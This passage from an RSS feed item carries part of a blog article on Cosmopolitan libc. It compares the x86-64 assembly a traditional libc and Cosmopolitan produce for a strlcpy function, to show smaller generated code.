  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = <span>'\0'</span>;
  }
  <span>return</span> slen;
}
</pre>

<p>
  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

</p><table><tbody><tr><td>
<pre><span>/ compiled with traditional libc</span>
<span>strlcpy</span>:
	<span>push</span>	<span>%rbp</span>
	<span>mov</span>	<span>%rsp</span>,<span>%rbp</span>
	<span>push</span>	<span>%r14</span>
	<span>mov</span>	<span>%rsi</span>,<span>%r14</span>
	<span>push</span>	<span>%r13</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r13</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>push</span>	<span>%r12</span>
	<span>push</span>	<span>%rbx</span>
	<span>mov</span>	<span>%rdx</span>,<span>%rbx</span>
	<span>call</span>	strlen
	<span>mov</span>	<span>%rax</span>,<span>%r12</span>
	<span>test</span>	<span>%rbx</span>,<span>%rbx</span>
	<span>jne</span>	1f
	<span>pop</span>	<span>%rbx</span>
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
1:	<span>cmp</span>	<span>%rbx</span>,<span>%rax</span>
	<span>mov</span>	<span>%r14</span>,<span>%rsi</span>
	<span>mov</span>	<span>%r13</span>,<span>%rdi</span>
	<span>cmovbe</span>	<span>%rax</span>,<span>%rbx</span>
	<span>mov</span>	<span>%rbx</span>,<span>%rdx</span>
	<span>call</span>	memcpy
	<span>movb</span>	$<span>0</span>,0(<span>%r13</span>,<span>%rbx</span>)
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%rbx</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td><td>
<pre><span>/ compiled with cosmopolitan libc</span>
<span>strlcpy</span>:
	<span>mov</span>	<span>%rdx</span>,<span>%r8</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r9</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>call</span>	strlen
	<span>test</span>	<span>%r8</span>,<span>%r8</span>
	<span>je</span>	1f
	<span>cmp</span>	<span>%r8</span>,<span>%rax</span>
	<span>lea</span>	<span>-1(%r8)</span>,<span>%rdx</span>
	<span>mov</span>	<span>%r9</span>,<span>%rdi</span>
	<span>cmova</span>	<span>%rax</span>,<span>%rdx</span>
	<span>call</span>	MemCpy
	<span>movb</span>	$<span>0</span>,(<span>%r9</span>,<span>%rdx</span>)
1:	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td></tr></tbody></table>

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.

</p>
</div>]]>
            </description>
            <link>https://justine.lol/cosmopolitan/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556286</guid>
            <pubDate>Mon, 28 Dec 2020 02:59:32 GMT</pubDate>
        </item>
    </channel>
</rss>
